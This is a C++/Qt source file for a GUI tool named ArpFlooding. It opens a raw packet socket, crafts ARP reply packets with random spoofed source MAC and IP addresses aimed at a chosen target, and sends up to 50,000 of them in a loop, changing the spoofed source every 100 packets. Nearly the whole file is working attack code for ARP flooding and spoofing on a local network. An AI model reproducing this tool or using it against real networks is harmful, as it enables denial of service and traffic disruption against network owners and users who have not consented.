#include "arpflooding.h"
#include "ui_arpflooding.h"
#include <sys/socket.h> // socket()
#include <sys/types.h>  //uint8_t,uint16_t,
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>  //ioctl
#include <bits/ioctls.h>
#include "lbpcap.h"
#include <unistd.h>
#include <QMessageBox>
#include <cstdio>
#include <cstring>
#include <QDebug>>


ArpFlooding::ArpFlooding(const char* device_name, QWidget *parent) :
    QDialog(parent),
    ui(new Ui::ArpFlooding)
{
    ui->setupUi(this);
    setFixedSize(this->width(),this->height());
    ui->progressBar->reset();
    device_ok=createDevice(device_name);
}

ArpFlooding::~ArpFlooding()
{
    if(device_ok)::close(sockfd);
    delete ui;
}

bool ArpFlooding::createDevice(const char* device_name){
    if(!~(sockfd=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL))) ){
        QMessageBox::critical(this,"Error","socket()1 failed ");
        return false;
    }
    struct ifreq ifr;
    bzero(&ifr,sizeof(ifr));
    bzero(&device,sizeof(device));
    std::strcpy(ifr.ifr_name,device_name);
    if(::ioctl(sockfd,SIOCGIFHWADDR,&ifr) <0){
        QMessageBox::critical(this,"Error","ioctl() Error");
        return false;
    }
    ::close(sockfd);
    std::memcpy(device.sll_addr,ifr.ifr_hwaddr.sa_data,6);
    if ( (device.sll_ifindex = if_nametoindex(device_name)) ==0){
        QMessageBox::critical(this,"Error","if_nametoindex() Error");
        return false;
    }
    device.sll_family=AF_PACKET;
    device.sll_halen = htons(6);

    if(!~ (sockfd=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL))) ){
        QMessageBox::critical(this,"Error","socker error!");
        return false;
    }
    return true;
}

const static QRegExp reg_mac("([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})");

int ArpFlooding::createPacket(uint8_t *packet){
    uint32_t tmp_mac[6];

    ether_header* ether=(ether_header*)packet;
    memcpy(ether->ether_source_addr,device.sll_addr,6);//source mac
    if(!reg_mac.exactMatch(ui->arp_destmac->text())){
        QMessageBox::critical(this,"Error","Dest Mac Adress is invalued!");
        return -1;
    }
    sscanf((const char*)ui->arp_destmac->text().toLower().toLatin1(),"%x:%x:%x:%x:%x:%x",&tmp_mac[0],
            &tmp_mac[1],&tmp_mac[2],&tmp_mac[3],&tmp_mac[4],&tmp_mac[5]);
    for(int i=0;i<6;++i)ether->ether_dest_addr[i]=tmp_mac[i];

    ether->ether_type=htons(0x0806);
    int len=sizeof(ether_header);
    arp_header* arp=(arp_header*)(packet+len);
    arp->arp_hardware_type=htons(1);//ethernet(1)
    arp->arp_hardware_size=6;
    arp->arp_protocol_type=htons(0x0800);//ipv4;
    arp->arp_protocol_size=4;

    arp->arp_operation_code=htons(2);//reply

    for(int i=0;i<6;++i)arp->arp_dest_macaddr[i]=tmp_mac[i];


    //rand the source mac and source ip
    for(int i=0;i<6;++i)arp->arp_source_macaddr[i]=qrand();


    struct in_addr* ip_addr=(struct in_addr*)(packet+(((const uint8_t*)&arp->arp_dest_ipaddr) - packet));
    if(inet_aton(ui->arp_destip->text().toLatin1(),ip_addr)==-1){
        QMessageBox::critical(this,"Error","arp dest ip adress is invalued!");
        return -1;
    }

    ip_addr=(struct in_addr*)(packet+(((const uint8_t*)&arp->arp_souce_ipaddr) - packet));
    QString srcIP = QString("%1.%2.%3.%4").arg(qrand()%256).arg(qrand()%256).arg(qrand()%256).arg(qrand()%255);
    if(inet_aton(srcIP.toLatin1(),ip_addr)==-1){
        QMessageBox::critical(this,"Error","arp source ip adress is invalued!");
        return -1;
    }

    len+=sizeof(arp_header);
    return len;
}


void randSource(uchar* packet){
    ether_header* ether=(ether_header*)packet;
    int len=sizeof(ether_header);
    arp_header* arp=(arp_header*)(packet+len);
    for(int i=0;i<6;++i)arp->arp_source_macaddr[i]=qrand();
    struct in_addr* ip_addr=(struct in_addr*)(packet+(((const uint8_t*)&arp->arp_dest_ipaddr) - packet));
    ip_addr=(struct in_addr*)(packet+(((const uint8_t*)&arp->arp_souce_ipaddr) - packet));
    QString srcIP = QString("%1.%2.%3.%4").arg(qrand()%256).arg(qrand()%256).arg(qrand()%256).arg(qrand()%255);
    inet_aton(srcIP.toLatin1(),ip_addr);
}

void ArpFlooding::on_pushButton_send_clicked()
{
    static uint8_t packet[1500];
    ui->pushButton_send->setEnabled(false);
    ui->progressBar->reset();
    int len;
    if(!~(len=createPacket(packet))){
        QMessageBox::critical(this,"Error","create packet failed , send stop!");
        ui->pushButton_send->setEnabled(true);
        return;
    }
    bool ok;
    int num=ui->number->text().toInt(&ok,10);
    if(!ok || num<1 || num>50000){
        QMessageBox::critical(this,"Error","the send packet number is invalued!");
        ui->pushButton_send->setEnabled(true);
        return;
    }
    int time_sleep=ui->time_interval->text().toInt(&ok,10);
    if(!ok || time_sleep<0 || time_sleep>50000){
        QMessageBox::critical(this,"Error","the time interval is invalued!");
        ui->pushButton_send->setEnabled(true);
        return;
    }
    time_sleep/=1000; //ms -> s
    for(int i=1;i<=num;++i){
        if(i%100==0)randSource(packet);
        int snd=sendto(sockfd,packet,len,0,(struct sockaddr*)&device,sizeof(device));
        if(snd<=0){
            QMessageBox::critical(this,"Error","sendto Error!");
            ui->pushButton_send->setEnabled(true);
            return;
        }
        ui->progressBar->setValue(i*100/num);
        if(i<num)sleep(time_sleep);
    }
    QMessageBox::information(this,"OK","send successful!");
    ui->pushButton_send->setEnabled(true);
}


